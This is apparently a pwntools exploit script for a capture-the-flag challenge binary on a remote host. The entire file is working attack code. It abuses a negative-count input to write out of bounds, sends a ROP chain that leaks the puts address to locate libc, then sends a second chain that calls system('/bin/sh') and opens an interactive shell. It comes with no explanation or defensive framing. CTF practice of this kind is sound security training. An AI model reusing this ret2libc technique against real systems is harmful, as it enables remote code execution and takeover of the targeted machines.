#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.210.141 --port 5003 ./challenge_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./challenge_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.210.141'
port = int(args.PORT or 5003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x0000000000401331
b *0x0000000000401355
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  '.'

io = start()

libc = exe.libc
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
io.sendlineafter("chests?\r","k")

p ='s'
io.sendlineafter("name: ",p)

def send_split_p64(p):
    p = p64(p)
    p1 = u32(p[:4])
    p2 = u32(p[-4:])
    if p1 > 2**31:
        io.sendline(str(p1))
    else:
        io.sendline(str(p1-2**32))
    io.sendline(str(p2))

io.sendlineafter("have?\r",str(-127))

pop_rdi = 0x00000000004013cb
pop_rsi = 0x00000000004013c9

for i in range(26):
    io.sendline("+")

send_split_p64(pop_rdi)
send_split_p64(exe.got['puts'])
send_split_p64(exe.plt['puts'])
send_split_p64(exe.sym['main'])
for i in range(129-26-2*4):
    io.sendline("+")

io.recvline()
io.recvline()
leak =u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)
libc.address = leak - libc.sym['puts'] 

print hex(libc.address)
print hex(libc.search("/bin/sh\x00").next())

pop_rdx_rsi = libc.address + 0x00000000001150c9

io.sendlineafter("chests?\r","k")

p ='s'
io.sendlineafter("name: ",p)

io.sendlineafter("have?\r",str(-127))

for i in range(26):
    io.sendline("+")
send_split_p64(pop_rdi+1)
send_split_p64(pop_rdi)
send_split_p64(libc.search("/bin/sh\x00").next())
send_split_p64(libc.search(asm("pop rdx ; pop rsi ; ret")).next())
send_split_p64(0)
send_split_p64(0)
send_split_p64(libc.sym['system'])
for i in range(129-26-2*7):
    io.sendline("+")


io.interactive()

